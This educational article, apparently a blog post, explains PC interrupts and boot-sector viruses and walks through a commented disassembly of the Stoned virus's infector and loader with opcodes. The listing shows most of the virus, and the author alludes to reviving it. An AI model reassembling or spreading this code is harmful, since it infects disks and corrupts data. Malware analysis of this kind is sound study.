![Stoned](Stoned.jpg)

>>> deploy:<br>
>>>  Journal.md<br>
>>>  +Stoned.jpg<br>

# Stoned Computer Virus

A condensed and nicely edited version of this material can be found in my article [A Look at Computer Viruses in Circuit Cellar magazine March 2003](http://www.cc-webshop.com/Circuit-Cellar-Issue-152-March-2003-PDF-FI-2003-152.htm).

# Viruses 

Civilization is the biological virus's best friend. Now that humans live closely and move around freely the biological virus has a better chance of spreading. The internet 
has done the same thing for the computer virus. Now that every computer is connected through the internet, the computer virus has more options to spread.

Computer viruses use to be tiny parasitic code fragments that inject themselves into the disk image of other programs. Viruses today are more sophisticated and much larger. 
Viruses used to be snippets of assembly language fragments. Some today are macro scripts embedded in a word document.

Like their biological counterparts, computer viruses occasionally mutate. Hackers, eager to show their coding prowess, disassemble viruses and change their functions. Often 
the change is for the worst causing damage to countless hard-drives -- beware the darkside of computer archeology.

Some viruses, like the Stoned virus we will be looking at shortly, are designed do nothing more than print a message on the screen. Aside from a slight drop in system 
performance, the user is mostly unaffected by the virus. Some viruses contain code-bugs that affect their potency. The Morris Internet Worm is a good example. It was 
supposed to be rather benign, but because of bugs, it inadvertently crippled thousands of machines at a considerable monetary cost. The Stoned virus, too, will inadvertently 
cripple a disk that fills up.

Some viruses are humorous; the Green Caterpillar virus (called the 1591 virus because of its code size) scrolls a green caterpillar down the text screen. Other viruses are 
designed specifically to do damage. The Michelangelo virus (a close cousin to the Stoned virus) used to get media attention every year. This virus hides in the background 
of a computer silently spreading from machine to machine until March 6th, the birthday of the famous 16th century Italian artist. On that day, the virus quickly erases the 
computer's hard-drive.

Before we look at the complete disassembly of the Stoned virus, I must remind you that Federal law provides severe penalties for computer crimes -- crimes like releasing a 
computer virus into the computing community. But we are computer archeologists, right? We are only interested in seeing how a virus works, and the Stoned virus is an intriguing 
archeological find.

# The PC Virus 

PCs seem especially susceptible to computer viruses. The PC was designed for home use, which meant IBM had to cut certain corners to keep the price down. These cutbacks opened 
the door for viruses.

The first cut corner was the processor. VAX and SUN CPUs have memory protection built into the processor. This is a must for any serious multi-user system. But the PC was 
initially designed for a single user -- a user that would have free reign on the system. Of course that means a virus executed by the user also has free reign on the 
system. (Memory management hardware has since become an integral part of CPUs used in PCs.)

The second cut corner was the operating system media. Hard-drives weren't cost effective when PCs first arrived on the scene. They were small and expensive (small in 
capacity but large in physical size!). To reach everyday users, the DOS operating system had to fit on a 560KB floppy. That left little room for process-multitasking 
or login security -- and forget a windowing environment.

Application vendors were also restricted to the floppy. Floppies are very portable and very easy to copy. Before long, the Sneakernet sprung to life -- a network of 
friends passing illegal copies of software among themselves. No hardware security, no operating system security, and portable, easy to duplicate application disks -- the 
PC world was a fertile ground for the virus.

But the heart of the computer viruses is the 8086 interrupt structure. As we will see, this scheme invites future upgrades to extend the base operating system by 
overriding system calls (a powerful object-oriented concept). Thus viruses are simply malicious OS upgrades!

# The 8086 Interrupt Structure 

The Intel 8086 CPU takes software interrupts to a new level. Instead of the eight interrupt levels supported by its predecessors, the 8086 supports 256! Interrupts are 
stilled mapped into the first chunk of memory, but now interrupt handler routines are "pointed to" by 256, four-byte far-pointers. The first four bytes of memory point 
to the service routine for interrupt 0. The next four bytes point to the service routine for interrupt 1 and so on filling the entire first 1K of memory. Why four bytes 
for a pointer? The 8086 uses a segmented memory scheme with a 2-byte segment address and a 2-byte offset address.

During an interrupt cycle, a hardware device places its interrupt number on the CPU data bus. The CPU multiplies this number by four and fetches the four-byte memory 
pointer. It then pushes the flags on the stack and performs a far CALL to the interrupt handler.

In an 8085 system, the ROM was mapped first in the address space. In the 8086, RAM comes first. This means that the interrupt table is in RAM and can be changed on the 
fly. As the operating system loads, it sets the interrupt vectors to point to the individual service routines. Thus the functionality of old hardware service routines 
can be upgraded periodically with new device drivers. New hardware devices ship with software that registers interrupt service routines in the appropriate vector.

Of course, keeping up with which device uses which interrupt can be a pain. There are some reserved vectors on typical PC systems. Interrupt 0 is called whenever the 
CPU tries to perform a division by 0. Interrupt 1 is the singlestep interrupt used for debugging code. Interrupt 8 is tied to a hardware clock. This interrupt is 
called regularly, and the system clock usually depends on this routine to increment a memory counter (the Stoned virus reads this counter).

Very few 8086 systems have 256 interrupting devices! The lion's share of the interrupt vectors are used as software interrupts. A program can invoke any interrupt routine 
through the INT XX command, where XX is the interrupt number from 00 to FF hex.

The BIOS establishes a few low-level routines that other programs can invoke. INT 10 is a complex video driver that manages the console window. Parameters passed into this 
function through the registers control a number of sub-functions that do things like loading fonts, scrolling the screen, and printing strings. INT 12 returns the amount of 
conventional memory in 1K chunks. INT 18 invokes the BASIC ROM (what a language). You can call INT 19 to reboot the machine. Through INT 13, programs can access sectors on 
disk drives connected to the system.

The ROM designers could have avoided the indirection of interrupt vectors by publishing a list of ROM routine addresses for programs to call directly. The RAM vector allows 
the BIOS to be upgraded by the operating system loaded from disk. Suppose the DOS designers had come up with a better way to access sectors on a disk. The ROM code is 
unchangeable, but DOS could change the INT 13 vector to point to the newer routines loaded from disk. Existing programs don't have to be told a new routine address -- they 
continue to use the routine indirectly through the INT 13 vector.

To encourage others to design hardware for their computers, IBM published the specs on the hardware bus used in the PC. Other people began to make hardware cards for 
the PC, which made PCs more attractive. The Intel 8086 chip was available to the public, and other vendors began to use the chip to build PC clones -- machines identical 
to the IBM PC save for the ROM code. The true PC ROM was the property of IBM, but compatible ROMs only had to mimic the IBM machines by setting up interrupt vectors that pointed to routines that performed the same basic functions.

There is an obvious disadvantage to "hanging" system calls on indirect software interrupt hooks: any program is free to change any of the vectors at any time. For instance, 
a program could remember the destination of a specific interrupt, say INT 13, and change the vector to point to a new routine. This new routine could perform some meaningful 
task (say, infecting a floppy disk) before calling the original handler routine. This is how a virus gets CPU time, but what does it mean to infect a floppy?

# Bootsector Viruses 

When you turn on the power to a PC or hit its reset button, the processor jumps to location FFFF:0000 in the memory map (physical address FFFF0).That means at least part 
of the ROM must be mapped into the end of the address space with the last sixteen being the first thing the processor executes.

The code at this location jumps backwards to an involved initialization routine that performs diagnostics and a memory check. Initialization is important, but this init 
code is relatively small. The meat of the ROM is a number of utility routines designed to be used by other programs. The initialization code sets the interrupt vectors 
to point to these routines accordingly -- again, these are routines like INT 8 (the hardware timer-tick handler) and INT 13 (primitive disk sector access methods).

Finally, the ROM loads the very first sector from the boot-disk into memory at 0000:7C00 and executes it. This first sector is called the bootsector. It is a small program 
that immediately loads the true operating system, whatever that may be, from the remainder of the disk. Actually, this is quite ingenious. The ROM doesn't have to know 
anything at all about the various operating systems as they evolve over time. Operating systems simply supply a bootsector program that knows the details.

The ROM performs a sanity check on the bootsector before it executes it. It checks to see if the first instruction in the sector is a JMP statement. Normally the jump 
takes the CPU beyond a small media descriptor table that describes the disk's configuration (number of heads, number of sectors, etc). If the bootsector contains a 
signature jump statement, the ROM executes it by setting the CS register to 0000 and the IP to 7C00. Here is the code from the ROM of my old 286 machine. It performs 
the transfer from ROM to the operating system.

```plainCode
; ROM BIOS BOOTSTRAP
; This is where control is transferred to the loaded bootsector
...
F000:F80B EA007C000000        JMP        0000:7C00
...
```

Bootsector programs have to be small; they have to fit in a 512 byte sector. The DOS bootsector simply loads the two hidden system files IO.SYS and 
MSDOS.SYS. MSDOS.SYS contains the DOS interrupt, INT 21. This is a massive interrupt handler with lots of subcommands selected by passing arguments through the 
AX register. Eventually, the DOS shell COMMAND.COM is loaded into memory. This is simply a program that reads commands from the keyboard and passes them to INT 21.

The Stoned virus discovered in April of 1991 was one of the first computer viruses on the PC scene. It is a special species of virus known as a "bootsctor virus". 
As the name suggests, viruses of this type infect the bootsector of an operating system's boot disk. As we will see, their operation is eloquent in its simplicity.

The original bootsector of an infected disk has been copied elsewhere on the disk and the virus has been placed in the bootsector. When the PC boots up, it unknowingly 
loads the virus into memory at 0000:7C00 and executes it. The virus moves to a permanent home in upper memory and changes the INT 13 vector to point to a special 
routine in the virus code. At this point, the virus usually infects any fixed-disk on the system. Then it loads the original bootsector into memory at 0000:7C00 and 
executes it. DOS loads unaware of the new INT13 routine.

Every program performs disk access through INT 13 (using the DOS routines through INT 21 won't save you since INT21 ends up calling INT13). Thus every program activates 
the virus every time it touches a disk. The viral routine secretly makes sure the bootsector of the accessed floppy has been infected before passing the disk request 
on to the normal INT13. The slight delay usually goes unnoticed by the calling program. Since COMMAND.COM makes use of INT13, something as high-level as doing a DIR 
on a floppy will trigger an infection.

Despite their limited code space, bootsector viruses usually find a few extra bytes to do something special. The Stoned virus randomly prints the message "Your PC is 
now STONED!" when the computer is booting up. The Michelagelo virus, also a bootsector virus, erases the disk of the booting computer if the system date is March 6th.

The really complex viruses (the Green Caterpillar for instance) operate a little differently. Instead of attacking a disk's boot sector, they infect every executable 
file they come in contact with by tagging onto the end of the executable-file and changing the entry point to execute the virus first. Once the virus has executed and 
made itself "resident", it starts the host program at its original entry point. Becoming resident involves hooking into the DOS interrupt, INT21, and overriding the 
functions that open files. Thus whenever a file is opened by any program (including COMMAND.COM), the virus is triggered to attempt an infestation. COM files and EXE 
files have to be infected differently, and the code for these viruses tends to be longer than we could tackle here.

There is something charming about the compact-simplicity of the bootsector viruses, especially the classic example: Stoned. Without further adieu, let's dig in.

# Overview 

The Stoned virus has two basic parts: a Loader that gets called when the bootsector is loaded, and an Infector that replaces the INT13 vector. The virus jumps from the 
entry point at location 0000 to the Loader at 00A1.

There is a 13-byte storage area at 0008. We will see how this memory is used when we get to the walk-through.

Locations 0015 through 00A0 hold the Infector routine -- the replacement INT13 that other programs call when they need to perform disk I/O. The code at 0066 checks 
to see if the bootsector on the floppy has been infected, and the code at 0079 performs the infection if needed. Location 0035 passes the incoming request to the 
original INT13.

Locations 00A1 through 01B7 hold the Loader routine -- the code fragment that moves the virus into safe memory, registers the Infector INT13, and executes the 
original bootsector. Beginning at 00B8, the virus reserves permanent memory at the end of RAM. At 00D8, the virus is transferred to upper memory where execution continues.

The code at 00E4 loads the original bootsector from either the floppy or hard-disk depending on how the machine is booting. The Stoned message is printed from the 
code at 0118. The jump at 0154 executes the original bootsector. The code at 0159 infects the hard-drive being careful to preserve the partition table, and two ASCII 
strings are tagged onto the end of the virus beginning at 0189.

# Code Walkthrough 

Here is the commented disassembly of the Stoned virus in its entirety without regard for any copyrights! Actually, a virus is the ultimate in shareware -- it's free, 
and you get it whether you want it or not.

Remember that the Intel 8x86 chips are little-endians; the least significant byte of a word is stored first in memory. The disassembler I used to generate the listing 
below conveniently re-orders the bytes of a word for easier reading. Whenever you see a four-digit number, the actual bytes are stored in reverse order. You'll need to 
remember this if you are going to follow my directions later to bring the virus back to life!

When the program starts, it is in memory at 0000:7C00. As we saw earlier, the ROM bootstrap loads the bootsector into memory at this location, checks for a signature 
JMP statement (evidently any kind of jump will do), and then executes the program by setting the code segment to 0000 and the instruction pointer to 7C00.

The virus will eventually move itself around in memory and copy itself to disk. The math for these operations is much easier if the offset is 0000. The program's first 
action is to re-align the CS register so that the virus is at the beginning of segment 07C0. The far jump at location 0000 does nothing more than jump to the very next 
instruction changing the CS and IP registers along the way. The second instruction is a short (relative) jump over the Infector code and some storage to the Loader at 00A1.

```plainCode
; STONED PC COMPUTER VIRUS 
; (BOOTSECTOR INFECTOR)
;
; This jump is checked by the ROM to verify that a valid boot sector is present.
0000: EA 05 00 C0 07    JMP     $07C0:$0005             ; *1 07C0 is where the boot sector is
;                                                       ; loaded. Jump to next instruction.               
;                                                       ; (Re-orient the CS along the way)
;
0005: E9 99 00          JMP     $00A1                   ; *2 Jump over data area
;
0008: 00                ; Media source. 0 if loaded from a floppy, 2 from a fixed disk.
;     Offs Seg
0009: 00 00 00 00       ; Original INT 13 vector
000D: E4 00 00 00       ; Resident virus location in memory      (used for easy JMP)
0011: 00 7C 00 00       ; Pointer to original boot sector memory (used for easy JMP)
```

Anytime you find two absolute jumps together in a control flow a red flag should get raised. Why jump from location 0000 to location 0005 and then from location 
0005 to 00A1? Why not just jump from 0000 directly to 00A1? The extra jump instruction wastes three bytes of memory. On this dig we are going to identify several 
places where bytes could be saved!

The virus uses a 13-byte data-area beginning at 0008. The first byte of this data is a flag that describes what kind of disk the bootsector was loaded from. If the 
byte is 0, the bootsector was loaded from a floppy. If the byte is 2, the bootsector was loaded from a fixed disk. The virus moves the original bootsector to a "free" 
sector elsewhere on the disk. The location of this sector is different for floppies and hard-disks, as we will see. This flag is the virus's only way of knowing where 
to find the original bootsector needed to bring the computer up once the virus has initialized.

As the virus loads, it fills the four bytes at 0009 with the segment and offset of the address of the original INT 13 vector (pointing somewhere in ROM). This will be 
used to pass requests on to the original disk I/O handler.

The four bytes at 000D are used as an indirect reference to transfer control to the virus when it is copied into permanent memory. We'll see how this works shortly, 
but notice that the offset is already known -- the virus simply fills in the segment address of its new home. Likewise, the four bytes at 0011 are used as an indirect 
reference to the original bootsector when the virus has loaded. Neither of these indirect pointers is really needed, as we will see.

## The Infector 

```plainCode
;-----------------------------------------------------------------
; Infector
;-----------------------------------------------------------------
; New INT 13 handler
0015: 1E                PUSH    DS                      ; Hold ...
0016: 50                PUSH    AX                      ; ... incoming parameters
0017: 80 FC 02          CMP     AH,$02                  ; Is this a READ SECTOR request?
001A: 72 17             JB      $0033                   ; Ignore all requests ...
001C: 80 FC 04          CMP     AH,$04                  ; ... except ...
001F: 73 12             JNB     $0033                   ; ... READ = 2 or WRITE = 3 ...
0021: 0A D2             OR      DL,DL                   ; ... to drive 0 ...
0023: 75 0E             JNZ     $0033                   ; ... (floppy)
0025: 33 C0             XOR     AX,AX                   ; Set the DS register ...
0027: 8E D8             MOV     DS,AX                   ; ... to 0000
; The first sector in a group written to disk starts the drive motor. This check is a way
; for the virus to check the boot sector only on the first sector in a group and not
; on every sector which would bring the disk access to a crawl.
0029: A0 3F 04          MOV     AL,[DS:$043F]           ; Check to see if drive motor is ...
002C: A8 01             TEST    AL,$01                  ; ... already turned on.
002E: 75 03             JNZ     $0033                   ; Yes ... don't do anything
0030: E8 07 00          CALL    $003A                   ; Do any viral infection
0033: 58                POP     AX                      ; Restore original ...
0034: 1F                POP     DS                      ; ... incoming parameters
0035: 2E FF 2E 09 00    JMP     FAR [CS:$0009]          ; Execute the original INT 13
```

At this point, the Loader has long since finished its work; the virus is safe in the upper area of conventional memory. The virus has been "hooked into" INT 13 by 
remembering the original vector in its data-area and changing the INT vector to point to 0015. Location 0015 is then called by some poor, unsuspecting program needing 
disk access. The virus comes to life and does its thing (infecting floppies) and then silently passes the request on to the original handler. The calling program is 
none the wiser.

The virus passes all functions except reading or writing a sector on the floppy straight through to the original INT13 handler. When a floppy read or write occurs, 
the above section of code calls the following routine that infects the bootsector of the floppy if it isn't already infected -- but the jump is only taken if the 
lowest bit of location 0000:043F is off.

This bit represents the state of the floppy-drive's motor. If the bit is one, the drive is running. If the bit is zero, the drive is off. This is really a clever 
check that keeps the virus from taking action with every single sector read or write. Data is usually accessed as a stream of sectors. The first sector requested 
gets the motor going, and the motor continues to run while the remaining data is transferred. (Actually the motor continues to run for a few seconds after the 
last sector is accessed.) By watching the motor, the virus only takes effect on the first sector in a stream of sectors. Otherwise, the user would notice a terrible 
drop in performance for disk access. Again, this check is quite clever.

```plainCode
; Try to infect Drive A
;
003A: 53                PUSH    BX                      ; Save all ...
003B: 51                PUSH    CX                      ; ...
003C: 52                PUSH    DX                      ; ...
003D: 06                PUSH    ES                      ; ...
003E: 56                PUSH    SI                      ; ...
003F: 57                PUSH    DI                      ; ... registers
0040: BE 04 00          MOV     SI,$0004                ; 4 attempts at reading (motor warm up)
0043: B8 01 02          MOV     AX,$0201                ; Read one sector
0046: 0E                PUSH    CS                      ; Set ES to point ...
0047: 07                POP     ES                      ; ... to code segment
0048: BB 00 02          MOV     BX,$0200                ; Just past the virus in memory
004B: 33 C9             XOR     CX,CX                   ; Cyl 0, Sect 1 (shortly)
004D: 89 CA             MOV     DX,CX                   ; Head 0, Drive 0
004F: 41                INC     CX                      ; Now Cyl 1
0050: 9C                PUSHF                           ; *4 Set stack as if an interrupt
```

The infection process first preserves all the incoming parameters and sets up a call to the original INT13 to load the bootsector of the floppy into memory 
just after the virus. Note the PUSHF instruction at 0050. The original INT13 is an interrupt handler, and its last instruction is an RETI -- RETurn from Interrupt. 
Since the virus will be CALLing the routine, it must push the flags onto the stack to simulate an INT. Otherwise, too much information is popped off the stack 
with the RETI, and the CPU crashes.

```plainCode
0051: 2E FF 1E 09 00    CALL    FAR [CS:$0009]          ; Read boot sector with INT 13
0056: 73 0E             JNB     $0066                   ; Got it ... move on.
0058: 33 C0             XOR     AX,AX                   ; Reset drive command
005A: 9C                PUSHF                           ; Set stack as if an interrupt
005B: 2E FF 1E 09 00    CALL    FAR [CS:$0009]          ; Reset drive with INT 13
0060: 4E                DEC     SI                      ; All attempts tried?
0061: 75 E0             JNZ     $0043                   ; No ... keep trying
0063: EB 35             JMP     $009A                   ; Couldn't do it ... out
0065: 90                NOP                             ; Assembler fill
```

The NOP instruction at 0065 is confusing at first glance. The jump at 0056 jumps over the NOP to location 0066, and no other jump in the code brings the CPU 
back to location 0065. This is simply a wasted byte with no other function than to take up space. Why would a programmer, already limited to a sector's worth 
of code, waste a byte with a NOP that is never hit?

The answer is -- the programmer didn't do it. This extra instruction was actually inserted by the assembler! Have a look at the opcode for another JMP statement 
early in the code at location 0005. E9 is the JMP opcode followed by a two-byte, signed offset. Adding 0099 to 0008 (the location of the next instruction) puts 
the destination of the jump at 00A1.

Unlike the E9 absolute-jump, all of the conditional-jumps (like the one at location 0061 above) use a single-byte, signed offset. Thus conditional jumps cannot 
jump to code more than about 128 bytes away in either direction. This makes good sense; conditional jumps are very frequent, and they are normally used to jump 
over an instruction or two or back up to the top of a short loop. Designing the instruction set with single-byte-offset conditional jumps makes for tight code, 
and it works for about 99% of all cases. For the rare, longer conditional jumps, programmers must branch out to a nearby absolute JMP statement that can reach 
anywhere in the segment -- or beyond.

The EB opcode at 0063 is a type of conditional jump (with a single byte offset) except that the condition is always true. For short jumps, programmers can use 
this single-byte-offset form of JMP rather than wasting an extra byte on an offset with an MSB of 00.

The trouble comes when the assembler is allowed to choose between the two forms of jump. Remember that assemblers make two passes while building an object file. 
On the first pass, the assembler calculates the memory location of all labels in the program; this is easy since instructions have fixed lengths. On the second 
pass, the assembler uses the label-table to build the opcodes and operands for the instructions.

When the assembler comes to a JMP statement on the first pass where the label's address has already been resolved (a backward jump), the assembler can easily 
calculate the distance back to the label and use a one-byte or two-byte offset as appropriate. When it comes to a JMP statement where the address for the label 
is not known (a forward jump to a label not defined yet), it has no way of knowing if the destination is within reach of a single-byte offset. It must assume 
the worst and treat the jump as a two-byte offset.

On the second pass, all of the labels are known -- but they are stubbornly established. When the assembler recognizes that a forward jump is actually a one-byte 
jump, it sticks in the single byte form of the jump (which executes a bit faster) and pads the previously reserved space with an arbitrary value. Any value will 
do since the byte will never get executed, but the safest byte is the NOP instruction. This is what we are seeing in the virus code.

Most assemblers provide a way to force a JMP instance to single-byte-offset form (a standard error is generated if the destination is, in fact, out of reach). 
Some assemblers (like Borland's TASM) allow you to specify the number of passes used to resolve forward-references. With an extra pass or two, the assembler can 
eliminate the wasted NOPs.

Searching the code for forward jumps reveals only two: this one and the one at the one at 0105. Closing up these wasted bytes frees two more bytes of memory -- 
five so far.

```plainCode
; At this point the drive is responding - load the boot sector into virus memory segment
; and check if it has been infected.
0066: 33 F6             XOR     SI,SI                   ; Virus starting point
0068: BF 00 02          MOV     DI,$0200                ; Just read boot sector
006B: FC                CLD                             ; Moving forward
006C: 0E                PUSH    CS                      ; Set DS to ...
006D: 1F                POP     DS                      ; ... code segment
006E: AD                LODSW                           ; First word of virus
006F: 3B 05             CMP     AX,[DI]                 ; Looks the same as boot sector?
0071: 75 06             JNZ     $0079                   ; No ... we need to infect
0073: AD                LODSW                           ; Compare second words to be sure
0074: 3B 45 02          CMP     AX,[DI+$02]             ; Looks the same?
0077: 74 21             JZ      $009A                   ; Yes ... already infected
;
; Boot sector is not infected - move original into FAT table and write virus to boot sector.
0079: B8 01 03          MOV     AX,$0301                ; Write one sector
007C: BB 00 02          MOV     BX,$0200                ; Point to original boot
007F: B1 03             MOV     CL,$03                  ; *5 Cyl 0, Sec 3
0081: B6 01             MOV     DH,$01                  ; Head 1, Drive 0
0083: 9C                PUSHF                           ; Set stack as if an interrupt
0084: 2E FF 1E 09 00    CALL    [CS:$0009]              ; Hold original boot sector
0089: 72 0F             JB      $009A                   ; Error ... out of here
008B: B8 01 03          MOV     AX,$0301                ; Write one sector
008E: 33 DB             XOR     BX,BX                   ; At offset 0
0090: B1 01             MOV     CL,$01                  ; Sector 1
0092: 33 D2             XOR     DX,DX                   ; Drive head 0
0094: 9C                PUSHF                           ; As if an interrupt
0095: 2E FF 1E 09 00    CALL    FAR [CS:$0009]          ; Write virus to normal boot entry
;
; Restore original parameters to INT 13 request and do original INT 13.
009A: 5F                POP     DI                      ; Restore all ...
009B: 5E                POP     SI                      ; ...
009C: 07                POP     ES                      ; ...
009D: 5A                POP     DX                      ; ...
009E: 59                POP     CX                      ; ...
009F: 5B                POP     BX                      ; ... Registers
00A0: C3                RET                             ; Done
```

The rest of the Infector code is straightforward. The current bootsector is loaded from the floppy into memory. If the first four bytes of the sector match the 
virus, the sector must already be infected and the virus leaves it alone. Otherwise, the original sector is written to a holding place on the floppy (cylinder 0, 
sector 3, head 1). Then the virus writes itself into the bootsector completing the infection process. Finally, the original INT13 routine is invoked to handle the 
incoming request for the calling program.

There is nothing special about the holding sector -- it appears to be a sector deep in the files area of the floppy. If the floppy begins to fill up, this sector 
could get over-written corrupting the boot process. The floppy will no longer be bootable, but no file damage will occur. If the virus infects a floppy that is 
almost filled up, it will blindly write the bootsector over any data stored in the holding sector. In this case, file damage does occur.

On fixed-disks, the holding place is cylinder 0, sector 7, head 0, which is near the end of the root directory. If the fixed-disk has more than 96 entries in the 
root directory, the same kind of corruption will occur.

## The Loader 

```plainCode
;-----------------------------------------------------------------
; Loader
;-----------------------------------------------------------------
; Executes on bootup
00A1: 33 C0             XOR     AX,AX                   ; Set DS to ...
00A3: 8E D8             MOV     DS,AX                   ; ... system segment
00A5: FA                CLI                             ; No interrupts through here
00A6: 8E D0             MOV     SS,AX                   ; Set a temporary ...
00A8: BC 00 7C          MOV     SP,$7C00                ; ... stack 
00AB: FB                STI                             ; Interrupts can happen now
00AC: A1 4C 00          MOV     AX,[DS:$004C]           ; Save ...
00AF: A3 09 7C          MOV     [DS:$7C09],AX           ; ... original ...
00B2: A1 4E 00          MOV     AX,[DS:$004E]           ; ... INT 13 ...
00B5: A3 0B 7C          MOV     [DS:$7C0B],AX           ; ... vector.
00B8: A1 13 04          MOV     AX,[DS:$0413]           ; *6 Number of K bytes in free memory
00BB: 48                DEC     AX                      ; Reserve ...
00BC: 48                DEC     AX                      ; ... 2K for virus (and buffer)
00BD: A3 13 04          MOV     [DS:$0413],AX           ; New number of available K bytes
00C0: B1 06             MOV     CL,$06                  ; Convert K byte number ...
00C2: D3 E0             SHL     AX,CL                   ; ... to segment address
00C4: 8E C0             MOV     ES,AX                   ; MOVSB destination: virus segment
00C6: A3 0F 7C          MOV     [DS:$7C0F],AX           ; Store virus segment in our area
00C9: B8 15 00          MOV     AX,$0015                ; Offset to new INT13 handle
00CC: A3 4C 00          MOV     [DS:$004C],AX           ; New INT13 offset ...
00CF: 8C 06 4E 00       MOV     [DS:$004E],ES           ; ... and segment
00D3: B9 B8 01          MOV     CX,$01B8                ; Bytes in virus
00D6: 0E                PUSH    CS                      ; DS points to ...
00D7: 1F                POP     DS                      ; ... segment with virus code
00D8: 33 F6             XOR     SI,SI                   ; Offsets are both ...
00DA: 8B FE             MOV     DI,SI                   ; ... zero
00DC: FC                CLD                             ; Moving forward
00DD: F3 A4             REPZ    MOVSB                   ; Move virus into top of memory
00DF: 2E FF 2E 0D 00    JMP     FAR [CS:$000D]          ; Continue with next instruction in
                                                        ; new segment.
```

Now we come to 00A1 -- the destination of the jumps in the first few bytes of the program. Remember that the computer is booting up at this point, and the virus 
has just been loaded into memory at 0000:7C00. The CS register has been re-oriented so that this instruction is executed at 07C0:00A1. First the virus suspends 
all interrupts and establishes a temporary stack. Then the original INT13 vector is saved in the virus's data block.

The ROM bootstrap writes the amount of RAM (number of 1K chunks) as a byte to location 0000:0413. This is the value reported by INT 12. The virus takes the last 
two 1K-chunks from the memory pool by subtracting 2 from this location. The virus then calculates the segment address of the reserved area and copies its entire 
length from 0000:7C00 to the permanent location.

Why 2K? The virus is only 1/2K in length -- it just fits in the 512-byte bootsector. The virus must check (by loading) the bootsectors of disks into memory. 
Sectors are always 512 bytes. The virus only needs 1K. Yet it reserves 2K. The reason is a mystery -- for now. 

The segment value of the reserved memory is written into the virus data area at 000F -- just behind the offset value of 00E4. The indirect jump at 00DF makes a 
far jump from 07C0:00DF to RRRR:00E4 where RRRR is the reserved segment. The program picks up at the very next instruction in the listing except now it is running 
in its new home at the top of RAM.

This is a clever but confusing jump. If we think about it, all the virus is doing with this jump is changing the CS register to point to the new segment. The 
instruction pointer within the segment is the same no matter which segment the code is in. An easier way to change the CS register is to push ES, which contains 
the new segment, and then pop the CS register from the stack. Unfortunately, the POP CS instruction is not implemented by the architecture! I guess this instruction 
is more dangerous than useful -- and how often would the instruction be needed?

There is still an easier way to make the jump, however. The JMP instruction at 00DF can be changed to a direct FAR jump like this: 00DF: EA E4 00 RRRR (JMP RRRR:00E4). 
The segment value RRRR is not know until run time, but the MOV at location 00CF could be changed to write the segment value in ES into the code memory at offset 00E1. 
Then when the CPU gets to the instruction a few cycles later, it will know exactly where to go! This is called "self-modifying" code since the program actually writes 
its own instructions as it executes. Changing the JMP eliminates the four bytes of data at 000D. That brings our savings up to 9 bytes.

```plainCode
; At this point virus is running in its new 2K home at the end of RAM.
00E4: B8 00 00          MOV     AX,$0000                ; Reset disk system (prepare for IO)
00E7: CD 13             INT     $13                     ; Disk now ready
00E9: 33 C0             XOR     AX,AX                   ; Set ES to ...
00EB: 8E C0             MOV     ES,AX                   ; ... system segment
00ED: B8 01 02          MOV     AX,$0201                ; Read 1 sector
00F0: BB 00 7C          MOV     BX,$7C00                ; Read location = normal boot buffer
00F3: 2E803E0800 00     CMP     BYTE PTR [CS:$0008],$00 ; *7 Are we booting from a hard-disk?
00F9: 74 0B             JZ      $0106                   ; No ... use floppy hold sector
00FB: B9 07 00          MOV     CX,$0007                ; Cyl 0, Sec 7
00FE: BA 80 00          MOV     DX,$0080                ; Head 0, Drive 80
0101: CD 13             INT     $13                     ; Read original boot from storage
0103: EB 49             JMP     $014E                   ; Continue with normal boot
0105: 90                NOP                             ; Assembler fill
```

Once the virus has relocated, the parameters are set for loading the original bootsector into memory, but the virus has to find where it put the original 
bootsector. As we saw, this location is different depending on the type of disk. If the computer is booting from a fixed-disk, the virus simply loads the 
original bootsector and executes it. This initiates the normal boot process (with the INT13 Infector permanently installed).

If the virus is booting from a floppy, it does the extra work of infecting any fixed-disk on the system. There is also a random chance of getting the Stoned 
message on the screen if the computer is booting from a floppy. We'll see that code in a moment.

Notice the instruction at 00E4. AX is used to pass information into the INT13; AH contains the sub-command and AL contains some additional data. Using immediate 
MOVs to load parameters into registers for INT calls is second nature to 8x86 programmers, and we generally find immediate MOVs before any INTx instruction. 
However, at 00E4 the programmer could have saved a byte by doing an "XOR AX,AX" (which results in 0000). That brings our code savings up to 10 bytes.

```plainCode
; We are booting up from a floppy - have a look at any local fixed-disks.
0106: B9 03 00          MOV     CX,$0003                ; Cyl 0, Sec 3 
0109: BA 00 01          MOV     DX,$0100                ; Head 1, Drive 0
010C: CD 13             INT     $13                     ; Load the original boot sector
010E: 72 3E             JB      $014E                   ; Error -- nothing we can do!
0110: 26F6066C0407      TEST    BYTE PTR [ES:$046C],$07 ; *8 Low byte of timer (random)
0116: 75 12             JNZ     $012A                   ; Skip over 7/8 of the time
```

At 0106, the virus loads the original bootsector from the floppy. The conditional jump at 010E checks for any access errors, but this is really just a waste 
of space. If the original bootsector can't be loaded, the system will not come up no matter what the virus does. The jump transfers execution to 0000:7C00, 
which still contains the virus sector. An endless loop begins.

Error checking is only useful if you have the ability to recover from the error. Since there isn't much in the way of recovery at this point, I would have 
simply left out the two-byte conditional jump at 010E. But there is an even better reason to leave out the check: leaving it out makes the virus more potent. 
The code following this check tries to infect the fixed-disk -- which might work even if the floppy isn't responding. By handling the error at 010E, the virus 
rules out a potential infection. Leaving out the two-byte conditional jump brings our savings up to 12 bytes.

If booting from a floppy, the virus checks the low byte of the ever-changing clock-tick in memory at 0000:046C. A hardware clock interrupts the CPU several 
times a second, and the clock-handler routine increments the word at 0000:046C. There is no way to know what the clock-tick will be at this point -- this is 
essentially a random number. The test at 0116 will fall through to the next section of code if the lower three bits of the timer are all 0's. If you boot your 
PC from an infected floppy, you will see the famous "Your PC is now stoned!" message on average of once every eight boot-ups.

```plainCode
; 1 out of every 8 infected hard drives will see this message at the boot up where
; they are infected.
0118: BE 89 01          MOV     SI,$0189                ; Message
011B: 0E                PUSH    CS                      ; Set DS ...
011C: 1F                POP     DS                      ; ... to virus segment
011D: AC                LODSB                           ; Get byte in message
011E: 0A C0             OR      AL,AL                   ; Last loaded?
0120: 74 08             JZ      $012A                   ; Yes ... done with message
0122: B4 0E             MOV     AH,$0E                  ; Teletype mode
0124: B7 00             MOV     BH,$00                  ; Base of screen
0126: CD 10             INT     $10                     ; Print character
0128: EB F3             JMP     $011D                   ; Do all characters
;
012A: 0E                PUSH    CS                      ; Set ES ...
012B: 07                POP     ES                      ; ... to CS
012C: B8 01 02          MOV     AX,$0201                ; Read current boot from C:
012F: BB 00 02          MOV     BX,$0200                ; Buffer after virus
0132: B1 01             MOV     CL,$01                  ; Cyl = 0 (still), Sec = 1
